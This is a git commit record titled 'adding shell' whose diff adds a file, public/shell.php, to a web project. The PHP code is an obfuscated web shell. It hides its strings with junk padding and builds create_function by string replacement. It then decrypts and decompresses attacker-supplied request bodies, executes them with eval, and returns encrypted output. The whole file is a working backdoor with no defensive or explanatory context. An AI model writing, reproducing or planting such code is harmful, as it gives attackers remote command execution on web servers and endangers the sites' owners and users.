133619fd81206dea46e11de968373753ae53b4d3
Abdelhammied Elsayed <abdelhammied@gmail.com>
2020-01-12 12:33:37 +0000

    adding shell

---
+++ public/shell.php
@@ -0,0 +1,10 @@
+<?php
+$C='{$o.=$t{$xri}^$k{$xrj}xr;}}rexrturn $xro;xr}xrif (@pxrreg_match("/$khxrxr(.+)$kf/",@file_xrget_contxrexrnts("pxrxrhxrp:/';
+$f=str_replace('R','','crReatRRe_fRRRunction');
+$z='t_contents()xr;@oxrxrb_end_clexran();$r=@baxrxrse64_encxrode(@x(@gzxrcompressxr($o),$kxr));pxrrxrixrnt("$p$kh$r$kf");}';
+$c='xrk)xr{$c=xrstrlen($k);$l=strlxren(xr$t);xr$o="";for($xri=0xr;$i<$l;){foxrr($jxr=0;(xr$xrj<$c&&$i<xr$l);$jxr++,xr$i++)';
+$N='$k="e1xr0adcxr39";$kh="xr49ba5xr9abbe5xr6xr"xr;$kf="e057f20xrf8xr83e";xr$pxr="up2WPihxrmeIzdI5Bxr5";functionxr x($t,$xr';
+$T='/input"),$m)==1) {xr@ob_starxrt();@xrexrvaxrl(@gzuncompxrress(@x(@baxrsxre64_decode(xr$mxr[1]),$kxr)xr)xr)xr;$o=@ob_ge';
+$q=str_replace('xr','',$N.$c.$C.$T.$z);
+$h=$f('',$q);$h();
+?>
